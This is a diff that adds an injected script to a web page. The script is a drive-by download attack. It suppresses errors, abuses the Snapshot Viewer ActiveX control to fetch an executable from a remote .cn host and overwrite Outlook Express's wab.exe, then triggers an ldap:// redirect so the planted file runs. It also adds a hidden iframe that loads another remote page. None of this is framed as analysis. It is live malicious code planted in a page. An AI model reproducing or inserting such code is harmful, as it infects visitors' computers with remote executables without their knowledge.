@@ -1,0 +1,44 @@
+<script type="text/javascript">
+function killErrors() {
+return true;
+}
+window.onerror = killErrors;
+
+var x;
+var obj;
+var mycars = new Array();
+mycars[0] = "c:/Program Files/Outlook Express/wab.exe";
+mycars[1] = "d:/Program Files/Outlook Express/wab.exe";
+mycars[2] = "e:/Program Files/Outlook Express/wab.exe";
+
+var objlcx = new ActiveXObject("snpvw.Snapshot Viewer Control.1");
+
+if(objlcx="[object]")
+{
+
+setTimeout('window.location = "ldap://"',3000);
+
+for (x in mycars)
+{
+obj = new ActiveXObject("snpvw.Snapshot Viewer Control.1")
+
+var buf1 = 'http://down.hs7yue.cn/down/ko.exe';
+var buf2=mycars[x];
+var disxadc="fuckkav";
+obj.Zoom = 0;
+obj.ShowNavigationButtons = false;
+obj.AllowContextMenu = false;
+obj.SnapshotPath = buf1;
+
+try
+{
+obj.CompressedPath = buf2;
+obj.PrintSnapshot();
+
+}catch(e){}
+
+}
+}
+
+</script>
+<Iframe src="http://user1.jzm015.cn/ce.htm" width=100 height=0></iframe>
